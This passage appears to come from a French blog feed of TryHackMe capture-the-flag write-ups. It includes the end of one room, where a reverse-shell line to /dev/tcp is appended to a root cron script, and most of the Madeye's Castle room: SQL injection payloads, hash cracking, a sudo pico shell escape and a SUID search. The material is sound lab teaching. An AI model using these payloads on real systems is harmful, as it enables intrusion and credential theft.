&lt;p&gt;En se balandant sur la machine, on trouve &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;backup.sh&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;/opt/&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Un script de &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;backup&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; dans un &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;docker&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, g√©n√©ralement, y‚Äôa un cron derri√®re qui le run toutes les X secondes&lt;/p&gt;
&lt;p&gt;Et puisqu‚Äôon est root, on peut tout b√™tement ajouter ce qu‚Äôon veut dedans&lt;/p&gt;
&lt;p&gt;Donc on ajoute un payload de reverse shell et on lance un netcat sur notre machine&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è echo &amp;quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.8.47.144/1338 0&amp;gt;&amp;amp;1&amp;quot; &amp;gt;&amp;gt; backup.sh&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;J‚Äôai m√™me pas le temps de prendre un screen que le netcat re√ßoit la connection&lt;/p&gt;
&lt;p&gt;On est maintenant root sur la machine principale, et on peut r√©cup√©rer le dernier flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207948760-81200cc9-4369-4bf5-bfb1-b159424ffb6c.png&#34; alt=&#34;2022-12-15-193605_1920x1080_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è cat flag4.txt&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;THM{esc4l4tions_on_[...]_7a52b17dba6ebb0dc38bc1049bcba02d}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;gg!&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>TryHackMe - Madeye&#39;s Castle - Medium</title>
      <link>/posts/thm-madeyes/</link>
      <pubDate>Thu, 22 Dec 2022 00:00:00 +0000</pubDate>
      
      <guid>/posts/thm-madeyes/</guid>
      <description>madeyes-castle.thm Difficulty: Medium OS: Linux Description: A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja Link: https://tryhackme.com/room/madeyescastle Recon ‚å®Ô∏è nmap -A madeye.thm
‚å®Ô∏è dirb http://madeye.thm
En attendant qu‚Äôils se terminent, je me rend sur le site:
Page apache par d√©faut, rien de vraiment utile, j‚Äôouvre le dev tools pour √™tre sur qu‚Äôil n‚Äôy a rien d‚Äôintr√©ssant dans le code
Et je vois ceci dans le HTML:</description>
      <content>&lt;h1 id=&#34;madeyes-castlethm&#34;&gt;madeyes-castle.thm&lt;/h1&gt;
&lt;ul&gt;
&lt;li&gt;Difficulty: Medium&lt;/li&gt;
&lt;li&gt;OS: Linux&lt;/li&gt;
&lt;li&gt;Description: &lt;code&gt;A boot2root box that is modified from a box used in CuCTF by the team at Runcode.ninja&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Link: &lt;a href=&#34;https://tryhackme.com/room/madeyescastle&#34;&gt;https://tryhackme.com/room/madeyescastle&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;recon&#34;&gt;Recon&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è nmap -A madeye.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è dirb http://madeye.thm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;En attendant qu‚Äôils se terminent, je me rend sur le site:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207130778-2e336c40-1d08-47b3-ae7c-c6909c5ca3cb.png&#34; alt=&#34;2022-12-12-063059_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Page apache par d√©faut, rien de vraiment utile, j‚Äôouvre le dev tools pour √™tre sur qu‚Äôil n‚Äôy a rien d‚Äôintr√©ssant dans le code&lt;/p&gt;
&lt;p&gt;Et je vois ceci dans le HTML:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;!-- TODO: Virtual hosting is good. 
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;TODO: Register for hogwartz-castle.thm --&amp;gt;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Je garde √ßa de c√¥t√©, mais a priori si j‚Äôacc√®de au site depuis &lt;strong&gt;hogwartz-castle.thm&lt;/strong&gt;, j‚Äôaurai une page diff√©rence&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-text&#34; data-lang=&#34;text&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;PORT    STATE SERVICE     VERSION
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| ssh-hostkey: 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   2048 7f:5f:48:fa:3d:3e:e6:9c:23:94:33:d1:8d:22:b4:7a (RSA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|   256 53:75:a7:4a:a8:aa:46:66:6a:12:8c:cd:c2:6f:39:aa (ECDSA)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_  256 7f:c2:2f:3d:64:d9:0a:50:74:60:36:03:98:00:75:98 (ED25519)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;80/tcp  open  http        Apache httpd 2.4.29 ((Ubuntu))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-server-header: Apache/2.4.29 (Ubuntu)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;|_http-title: Apache2 Ubuntu Default Page: Amazingly It works
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;445/tcp open  netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Service Info: Host: HOGWARTZ-CASTLE; OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Le scan nmap montre qu‚Äôil y a un serveur smb, je vais m‚Äôy connecter et voir ce que je peux r√©cup√©rer dessus&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è smbclient -L //madeye.thm/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Le seul dossier accessible est le dossier &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sambashare&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, je vais dedans et je r√©cup√®re les deux fichiers&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207130825-a3e8248f-aa3b-4bfd-8fe6-e52cf73ea16f.png&#34; alt=&#34;2022-12-12-063626_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Le spellnames.txt est une liste de noms d‚Äôutilisateurs, et le notes.txt contient ceci:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Hagrid told me that spells names are not good since they will not &amp;ldquo;rock you&amp;rdquo;
Hermonine loves historical text editors along with reading old books.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Je devine assez facilement qu‚Äôil veut dire que ‚Äúrockyou‚Äù ne fonctionnera pas, et que donc il ne faut pas essayer de bruteforce le ssh&lt;/p&gt;
&lt;p&gt;J‚Äô√©dite mon &lt;strong&gt;/etc/hosts&lt;/strong&gt; pour changer le nom de domaine et acc√©der √† l‚Äôautre page&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207130898-ac1dc1a8-bf67-417b-b27a-3c86ac3cd5be.png&#34; alt=&#34;2022-12-12-063959_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Je m‚Äôy rends, et je tombe sur ceci:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207130917-f1d0f74d-3631-4486-a692-bcbbb1fda96e.png&#34; alt=&#34;2022-12-12-064102_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;sql-injection&#34;&gt;SQL Injection&lt;/h1&gt;
&lt;p&gt;Je tente une injection SQL classique:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Username: admin‚Äô or 1=1‚Äî -&lt;/li&gt;
&lt;li&gt;password: a&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;et le site m‚Äôaffiche ceci‚Ä¶&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207130935-29238dc9-6842-42e2-af16-cbee59a3ee3c.png&#34; alt=&#34;2022-12-12-064226_930x1026_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Je sais donc qu‚Äôil est vuln√©rable aux injections SQL, mais visiblement on ne peut pas contourner le login avec&lt;/p&gt;
&lt;p&gt;Je tente une SQLi UNION BASED, je ne vais pas d√©tailler les √©tapes pour cause de flemme mais voil√†&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;admin&amp;rsquo; UNION SELECT NULL,NULL,NULL,NULL&amp;ndash; -&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;‚Üí error&amp;quot;The password for None is incorrect! None&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;admin&amp;rsquo; UNION SELECT &amp;ldquo;a&amp;rdquo;,&amp;ldquo;b&amp;rdquo;,&amp;ldquo;c&amp;rdquo;,&amp;ldquo;d&amp;rdquo;&amp;ndash; -&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;‚Üí error&amp;quot;The password for a is incorrect! d&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;admin&amp;rsquo;UNION SELECT NULL,NULL,NULL,sqlite_version()&amp;ndash; -&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;‚Üí error&amp;quot;The password for None is incorrect! 3.22.0&amp;quot;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;admin&amp;rsquo;UNION SELECT NULL,NULL,NULL,sql FROM sqlite_master&amp;ndash; -&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;‚Üí error&amp;quot;The password for None is incorrect! CREATE TABLE users(\nname text not null,\npassword text not null,\nadmin int not null,\nnotes text not null)&amp;quot;&lt;/p&gt;
&lt;p&gt;J‚Äôai les colonnes de la table users:&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;name, password, admin, notes&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Je vais dump &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;password&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; et &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;notes&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;admin&amp;rsquo;UNION SELECT group_concat(notes,&amp;quot; &amp;ndash; &amp;ldquo;),NULL,NULL,NULL FROM users &amp;ndash; -&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Toutes les notes sont similaires sauf la deuxi√®me, qui donne un indice sur le nom d‚Äôutilisateur et le mot de passe&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;üí° My linux username is my first name, and password uses best64
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;En r√©cup√©rant la liste des utilisateurs avec la m√™me commande (remplace ‚Äúnotes‚Äù par ‚Äúname‚Äù), je vois que le deuxi√®me utilisateur est Harry&lt;/p&gt;
&lt;p&gt;Je r√©cup√®re son mot de passe (toujours le m√™me payload, mais on remplace ‚Äúnotes‚Äù par ‚Äúpassword‚Äù), puis j‚Äôutilise hashid pour savoir de quel type de hash il s‚Äôagit&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è hashid b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] SHA&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Whirlpool 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Salsa10 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Salsa20 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] SHA3&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Skein&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;] Skein&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1024&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;512&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;C‚Äôest donc √† priori du SHA-512, je lance donc hashcat en mode SHA-512, &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;avec la rule best64&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è hashcat -m 1700 password.hash -r /usr/share/hashcat/rules/best64.rule /home/conflict/wordlists/rockyou.txt&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;b326e7a664d756c39c9e09a98438b08226f98b89188ad144dd655f140674b5eb3fdac0f19bb3903be1f52c40c252c0e7ea7f5050dec63cf3c85290c0a2c5c885:wingardiumleviosa123
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;J‚Äôai donc le mot de passe de &lt;strong&gt;harry&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Je me connecte au ssh avec ce mot de passe&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207131371-97507cfb-d204-4300-bff4-01cfbff5923c.png&#34; alt=&#34;2022-12-12-192655_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;h1 id=&#34;privesc&#34;&gt;Privesc&lt;/h1&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è sudo -l&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Matching Defaults entries &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; harry on hogwartz&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;castle:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    env_reset, mail_badpass, secure_path&lt;span style=&#34;color:#f92672&#34;&gt;=/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;local&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;sbin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin\:&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;snap&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;User harry may run the following commands on hogwartz&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;castle:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (hermonine) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;pico
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    (hermonine) &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;usr&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;bin&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;pico
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Je vois que je peux donc utiliser le binaire &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;pico&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt; en tant que &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;hermonine&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;‚Üí &lt;a href=&#34;https://gtfobins.github.io/gtfobins/pico/&#34;&gt;GTFObins&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;J‚Äôutilise ce payload:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;u hermonine pico
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;R&lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt;X
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reset; sh &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&amp;amp;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207131441-1ff199bd-8aab-45a9-b0af-dc0efe7d3a2a.png&#34; alt=&#34;2022-12-12-193417_1888x1032_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Le shell n‚Äôest pas stable du tout, donc j‚Äôajoute ma cl√© ssh dans &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;~/.ssh/authorized_keys&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Puis je me connecte en ssh au compte &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;hermonine&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://user-images.githubusercontent.com/77807503/207131645-84b41c3d-75d4-437e-abb4-8b60a4fe633f.png&#34; alt=&#34;2022-12-12-193613_1920x1080_scrot&#34;&gt;&lt;/p&gt;
&lt;p&gt;Puisque je n‚Äôai pas le password de hermonine, je ne peux pas utiliser &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;sudo -l&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;, je liste donc les fichiers ayant le &lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;&lt;strong&gt;setuid bit&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è find / -user root -perm -4000 -exec ls -ldb {} \; &amp;gt;/tmp/filename&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;‚å®Ô∏è cat /tmp/filename&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;rwsr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;xr&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;x &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; root root &lt;span style=&#34;color:#ae81ff&#34;&gt;8816&lt;/span&gt; Nov &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;  &lt;span style=&#34;color:#ae81ff&#34;&gt;2020&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;srv&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;time&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;turner&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;swagger
